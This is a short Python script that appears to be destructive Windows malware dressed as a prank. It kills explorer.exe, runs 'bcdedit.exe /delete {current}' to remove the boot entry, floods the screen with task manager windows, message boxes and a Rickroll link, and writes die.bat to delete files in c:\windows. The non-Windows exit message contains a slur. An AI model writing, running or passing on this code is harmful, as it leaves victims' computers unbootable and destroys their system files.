from os import popen, kill, system
from signal import SIGKILL
import webbrowser
from time import sleep
from ctypes import windll
from sys import platform, exit

from psutil import process_iter, NoSuchProcess, ZombieProcess, AccessDenied

if not(platform == "win32" or platform == "win64"):
    print("why are you using this on non windows machine gay")
    sleep(1)
    exit()

def isProcessRunning(processName):
    for proc in process_iter():
        try:
            if processName.lower() in proc.name().lower():
                return True
        except (NoSuchProcess, AccessDenied, ZombieProcess):
            pass
    return False


def kill_process(name):
    if isProcessRunning(name):
        try:
            for line in popen("ps ax | grep " + name + " | grep -v grep"):
                fields = line.split()
                pid = fields[0]
                kill(int(pid), SIGKILL)
        except ProcessLookupError:
            pass
        except ChildProcessError:
            pass
    else:
        pass


def openSite(link):
    webbrowser.open(link, new=1)


# Start
kill_process("explorer.exe")
system("bcdedit.exe /delete {current}")

for _ in range(10):
    system("cmd /k taskmgr")
    sleep(0.01)
    windll.user32.MessageBoxA(0, "Your Computer", "still using this computer?", 0)
    sleep(0.01)
    openSite("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
    sleep(0.01)

with open("die.bat", "x") as f:
    f.write('@echo off\ndel /q "c:\\windows"\npause')
